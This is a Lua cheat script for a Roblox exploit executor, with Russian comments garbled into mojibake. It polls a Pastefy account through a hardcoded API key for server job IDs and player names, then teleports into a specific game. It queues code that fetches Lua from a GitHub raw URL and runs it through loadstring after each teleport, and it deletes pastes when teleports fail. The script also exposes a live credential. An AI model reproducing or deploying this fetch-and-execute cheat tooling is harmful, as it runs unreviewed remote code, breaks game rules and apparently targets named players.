_G.gg = _G.gg or false
if _G.gg then
    print("already")
    return
end
_G.gg = true
--// Services
local HttpService = game:GetService("HttpService")

--// –ö–æ–Ω—Ñ–∏–≥
local apiKey = "MM5yTY0WEWQaYQk0UVwgQU2zfEqsoa0U8aUSfxgzQsxzJvXA3BZHfzyzfgH6"
--// –ó–∞–≥–æ–ª–æ–≤–∫–∏ –∑–∞–ø—Ä–æ—Å–∞

local function parseDateTime(dateStr)
    local year, month, day, hour, min, sec = dateStr:match("(%d+)%-(%d+)%-(%d+) (%d+):(%d+):(%d+)")
    if year then
        return os.time({
            year = tonumber(year),
            month = tonumber(month),
            day = tonumber(day),
            hour = tonumber(hour),
            min = tonumber(min),
            sec = tonumber(sec)
        })
    end
    return 0
end
function missing(t, f, fallback)
    if type(f) == t then return f end
    return fallback
end

queueteleport =  missing("function", queue_on_teleport or (syn and syn.queue_on_teleport) or (fluxus and fluxus.queue_on_teleport))

local headers = {
    Accept = "application/json",
    ["Content-Type"] = "application/json",
    ["Authorization"] = "Bearer " .. apiKey,
}

local function deletePaste(pasteId)
    if not pasteId then
        warn("‚ùå Paste ID –Ω–µ –∑–∞–¥–∞–Ω!")
        return false, "Paste ID –Ω–µ –∑–∞–¥–∞–Ω"
    end

    local deleteUrl = "https://pastefy.app/api/v2/paste/" .. pasteId
    local req = { Url = deleteUrl, Method = "DELETE", Headers = headers }
    local response = request(req)

    if not response then 
        warn("‚ùå –ù–µ—Ç –æ—Ç–≤–µ—Ç–∞ –æ—Ç —Å–µ—Ä–≤–µ—Ä–∞")
        return false, "No response from request()"
    end

    print(("HTTP %s %s"):format(response.StatusCode or "?", response.StatusMessage or ""))

    local parsed = nil
    if response.Body and response.Body ~= "" then
        local ok, res = pcall(function() 
            return HttpService:JSONDecode(response.Body)
        end)
        if ok then
            parsed = res
        else
            print("‚ö†Ô∏è –ù–µ —É–¥–∞–ª–æ—Å—å —Ä–∞–∑–æ–±—Ä–∞—Ç—å JSON, –≤–æ–∑–º–æ–∂–Ω–æ —ç—Ç–æ —Ç–µ–∫—Å—Ç–æ–≤–æ–µ —Å–æ–æ–±—â–µ–Ω–∏–µ:", response.Body)
            parsed = { success = false, message = response.Body }
        end
    end

    if response.StatusCode == 404 then
        warn("‚ùå –ü–∞—Å—Ç–∞ –Ω–µ –Ω–∞–π–¥–µ–Ω–∞ –∏–ª–∏ —É–∂–µ —É–¥–∞–ª–µ–Ω–∞:", pasteId)
        return false, parsed
    end

    if parsed and parsed.success then
        print("‚úÖ –ü–∞—Å—Ç–∞ —É—Å–ø–µ—à–Ω–æ —É–¥–∞–ª–µ–Ω–∞!")
        return true, parsed
    end

    if response.StatusCode == 200 or response.StatusCode == 204 then
        print("‚úÖ –ü–∞—Å—Ç–∞ —É–¥–∞–ª–µ–Ω–∞ (–Ω–µ—Ç —Ç–µ–ª–∞ –æ—Ç–≤–µ—Ç–∞)")
        return true, parsed
    end

    warn("‚ùå –ù–µ —É–¥–∞–ª–æ—Å—å —É–¥–∞–ª–∏—Ç—å –ø–∞—Å—Ç—É:", parsed)
    return false, parsed
end


local TeleportService = game:GetService("TeleportService")

-- –°–ª–æ–≤–∞—Ä—å —Å –ø–æ–Ω—è—Ç–Ω—ã–º–∏ —Å–æ–æ–±—â–µ–Ω–∏—è–º–∏
local teleportMessages = {
    [Enum.TeleportResult.Success] = "‚úÖ –¢–µ–ª–µ–ø–æ—Ä—Ç–∞—Ü–∏—è –ø—Ä–æ—à–ª–∞ —É—Å–ø–µ—à–Ω–æ.",
    [Enum.TeleportResult.Failure] = "‚ö†Ô∏è –ù–µ–∏–∑–≤–µ—Å—Ç–Ω–∞—è –æ—à–∏–±–∫–∞ –ø—Ä–∏ —Ç–µ–ª–µ–ø–æ—Ä—Ç–∞—Ü–∏–∏.",
    [Enum.TeleportResult.GameNotFound] = "‚ùå –ò–≥—Ä–∞ –Ω–µ –Ω–∞–π–¥–µ–Ω–∞ (–≤–æ–∑–º–æ–∂–Ω–æ —Å–µ—Ä–≤–µ—Ä –∑–∞–∫—Ä—ã—Ç).",
    [Enum.TeleportResult.GameEnded] = "‚ùå –¶–µ–ª–µ–≤–æ–π —Å–µ—Ä–≤–µ—Ä –∑–∞–≤–µ—Ä—à–∏–ª —Ä–∞–±–æ—Ç—É.",
    [Enum.TeleportResult.GameFull] = "üö´ –°–µ—Ä–≤–µ—Ä –∑–∞–ø–æ–ª–Ω–µ–Ω, –ø–æ–ø—Ä–æ–±—É–π—Ç–µ –ø–æ–∑–∂–µ.",
    [Enum.TeleportResult.Unauthorized] = "‚õî –ù–µ—Ç –ø—Ä–∞–≤ –Ω–∞ —Ç–µ–ª–µ–ø–æ—Ä—Ç–∞—Ü–∏—é –≤ —ç—Ç–æ—Ç —Å–µ—Ä–≤–µ—Ä.",
    [Enum.TeleportResult.Flooded] = "‚ö†Ô∏è –°–ª–∏—à–∫–æ–º –º–Ω–æ–≥–æ –∑–∞–ø—Ä–æ—Å–æ–≤ –Ω–∞ —Ç–µ–ª–µ–ø–æ—Ä—Ç, –ø–æ–¥–æ–∂–¥–∏—Ç–µ –Ω–µ–º–Ω–æ–≥–æ.",
    [Enum.TeleportResult.IsTeleporting] = "‚ÑπÔ∏è –¢–µ–ª–µ–ø–æ—Ä—Ç —É–∂–µ –≤—ã–ø–æ–ª–Ω—è–µ—Ç—Å—è.",
}

-- –û—à–∏–±–∫–∏, –ø—Ä–∏ –∫–æ—Ç–æ—Ä—ã—Ö –Ω—É–∂–Ω–æ —É–¥–∞–ª–∏—Ç—å –ø–∞—Å—Ç—É
local deleteOnError = {
    [Enum.TeleportResult.GameNotFound] = true,
    [Enum.TeleportResult.GameEnded] = true,
    [Enum.TeleportResult.Unauthorized] = true,
    [Enum.TeleportResult.Failure] = true,
}

-- –ß—Ç–æ–±—ã –Ω–µ –≤—ã–∑—ã–≤–∞—Ç—å deletePaste –Ω–µ—Å–∫–æ–ª—å–∫–æ —Ä–∞–∑
local teleportFailedHandled = false

TeleportService.TeleportInitFailed:Connect(function(player, result)
    local message = teleportMessages[result] or ("‚ö†Ô∏è –ù–µ–∏–∑–≤–µ—Å—Ç–Ω—ã–π —Ä–µ–∑—É–ª—å—Ç–∞—Ç —Ç–µ–ª–µ–ø–æ—Ä—Ç–∞—Ü–∏–∏: " .. tostring(result))
    warn(message)

    if teleportFailedHandled then
        print("‚èπÔ∏è –û—à–∏–±–∫–∞ —Ç–µ–ª–µ–ø–æ—Ä—Ç–∞ —É–∂–µ –±—ã–ª–∞ –æ–±—Ä–∞–±–æ—Ç–∞–Ω–∞, –ø—Ä–æ–ø—É—Å–∫–∞–µ–º –ø–æ–≤—Ç–æ—Ä.")
        return
    end

    if deleteOnError[result] then
        teleportFailedHandled = true
        print("üßπ –ö—Ä–∏—Ç–∏—á–µ—Å–∫–∞—è –æ—à–∏–±–∫–∞ —Ç–µ–ª–µ–ø–æ—Ä—Ç–∞. –£–¥–∞–ª—è–µ–º –ø–∞—Å—Ç—É...")
        deletePaste(getgenv().paste)
    else
        print(result)
        print("‚ÑπÔ∏è –ü–∞—Å—Ç–∞ –Ω–µ –±—É–¥–µ—Ç —É–¥–∞–ª–µ–Ω–∞, —Ç–∞–∫ –∫–∞–∫ –æ—à–∏–±–∫–∞ –Ω–µ –∫—Ä–∏—Ç–∏—á–µ—Å–∫–∞—è.")
    end
end)


--// –ü–æ–ª—É—á–µ–Ω–∏–µ —Å–∞–º–æ–π —Å—Ç–∞—Ä–æ–π –ø–∞—Å—Ç—ã
local function getOldestPaste()
    local response = request({
        Url = "https://pastefy.app/api/v2/user/pastes",
        Method = "GET",
        Headers = headers
    })

    -- –ü—Ä–æ–≤–µ—Ä–∫–∞ –∫–æ–¥–∞ –æ—Ç–≤–µ—Ç–∞
    if not response or response.StatusCode ~= 200 then
        warn("‚ùå –û—à–∏–±–∫–∞ –ø—Ä–∏ –ø–æ–ª—É—á–µ–Ω–∏–∏ –ø–∞—Å—Ç:", response and response.StatusCode, response and response.StatusMessage)
        if response and response.Body then
            warn("–û—Ç–≤–µ—Ç —Å–µ—Ä–≤–µ—Ä–∞:", response.Body)
        end
        return
    end

    -- –î–µ–∫–æ–¥–∏—Ä—É–µ–º JSON
    local ok, data = pcall(function()
        return HttpService:JSONDecode(response.Body)
    end)

    if not ok or not data or #data == 0 then
        warn("‚ö†Ô∏è –ü–∞—Å—Ç—ã –Ω–µ –ø–æ–ª—É—á–µ–Ω—ã –∏–ª–∏ –º–∞—Å—Å–∏–≤ –ø—É—Å—Ç.")
        return
    end

    -- –°–æ—Ä—Ç–∏—Ä–æ–≤–∫–∞ –ø–æ timestamp
    table.sort(data, function(a, b)
        return parseDateTime(a.created_at) < parseDateTime(b.created_at)
    end)

    local oldest = data[1]
    if not oldest then
        warn("‚ö†Ô∏è –ü–∞—Å—Ç–∞ –Ω–µ –Ω–∞–π–¥–µ–Ω–∞.")
        return
    end

    local content = oldest.content or ""
    local lines = {}
    for line in content:gmatch("[^\r\n]+") do
        table.insert(lines, line)
    end

    local jobId = lines[1] -- –ø–µ—Ä–≤–∞—è —Å—Ç—Ä–æ–∫–∞
    local playerName = lines[2] -- –≤—Ç–æ—Ä–∞—è —Å—Ç—Ä–æ–∫–∞

    if jobId then
        print("üß© –°–∞–º–∞—è —Å—Ç–∞—Ä–∞—è –ø–∞—Å—Ç–∞ ID:", oldest.id)
        getgenv().name = playerName
        getgenv().paste = oldest.id
        local name = getgenv().name or ""
        local paste = getgenv().paste or ""
        local codeUrl = "https://raw.githubusercontent.com/Roma77799/testik/refs/heads/main/test2"

        queueCode = string.format([[
            getgenv().name = "%s"
            getgenv().paste = "%s"

            spawn(function()
                repeat task.wait() until game:IsLoaded()
                local success, err = pcall(function()
                    local code
                    if game.HttpGetAsync then
                        code = game:HttpGetAsync("%s")
                    else
                        code = game:HttpGet("%s")
                    end

                    if not code or code == "" then
                        error("Failed to fetch script or empty response")
                    end

                    if code:sub(1,1) == "<" then
                        error("–ü–æ–ª—É—á–µ–Ω HTML –≤–º–µ—Å—Ç–æ Lua. –ü—Ä–æ–≤–µ—Ä—å URL –∏–ª–∏ –∏—Å–ø–æ–ª—å–∑—É–π—Ç–µ raw/pastefy.")
                    end

                    local func, compileErr = loadstring(code)
                    if not func then
                        error("–û—à–∏–±–∫–∞ –∫–æ–º–ø–∏–ª—è—Ü–∏–∏ —Å–∫—Ä–∏–ø—Ç–∞: " .. tostring(compileErr))
                    end

                    func()
                end)

                if not success then
                    warn("–û—à–∏–±–∫–∞ –ø—Ä–∏ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏–∏ —Å–∫—Ä–∏–ø—Ç–∞ –ø–æ—Å–ª–µ —Ç–µ–ª–µ–ø–æ—Ä—Ç–∞:", err)
                end
            end)
        ]], name, paste, codeUrl, codeUrl)


        game:GetService("TeleportService"):TeleportToPlaceInstance(142823291, jobId)
    else
        warn("‚ö†Ô∏è JobId –≤ –ø–∞—Å—Ç–µ –Ω–µ –Ω–∞–π–¥–µ–Ω!")
        print("–°–æ–¥–µ—Ä–∂–∏–º–æ–µ –ø–∞—Å—Ç—ã:\n" .. content)
    end
end

game.Players.LocalPlayer.OnTeleport:Connect(function()
    if queueteleport then
        queueteleport(queueCode)
    else
        print("queue –Ω–µ—Ç—É")
    end
end)

while true do
    getOldestPaste()
    wait(1)
end
